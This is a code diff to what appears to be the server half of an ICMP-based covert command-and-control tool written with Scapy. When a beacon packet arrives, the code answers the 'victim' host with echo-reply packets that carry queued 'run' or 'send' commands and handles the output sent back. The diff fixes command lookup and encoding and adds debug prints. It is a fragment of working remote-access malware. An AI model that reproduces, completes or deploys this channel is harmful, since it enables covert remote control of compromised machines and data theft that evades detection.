@@ -19,29 +19,37 @@ def send_command(ip_adr,id_type):
     if not commands_que:
         return
     print("commands_que:")
-    print(type(commands_que))
     prefix = next(iter(commands_que))
     print("prefix is: " + prefix)
-    command_name = commands_que[id_type]
+    command_name = commands_que[prefix]
     print("command is: " + command_name)
     if prefix == "run":
         prefix = RUN
     elif prefix == "send":
         prefix = FILE
-    bin_command = str_to_binary(command_name)
+    #bin_command = str_to_binary(command_name)
+    bin_command = bytes(command_name.encode())
+    print(bin_command)
+
     pkt_no_data = IP(dst=ip_adr)/ICMP(type="echo-reply",id=id_type)
-    pkt_send(pkt_no_data,prefix + bin_command)
+    combined = prefix + bin_command
+    pkt_send(pkt_no_data,combined,0)
+
+    #send(IP(dst=ip_adr)/ICMP(type="echo-reply",id=id_type)/prefix+bin_command)
     commands_que = ""
         
     
 def parse_packet(packet):
     global opened_fd
+    print("i am in parse")
     if Raw in packet:
         victim_ip = packet[IP].src
         id_packet = get_packet_id(packet)
         prefix_packet = check_prefix(packet)     
         data_recieved = extract_data(packet)
+        print(prefix_packet)
         if prefix_packet == BEACON:
+            
             send_command(victim_ip,id_packet)                 # check if there is a command in the queue and send if there is
       
         elif prefix_packet == BEGIN_OUTPUT:           # a packet that tells the server to prepare; name of the command in the data extracted
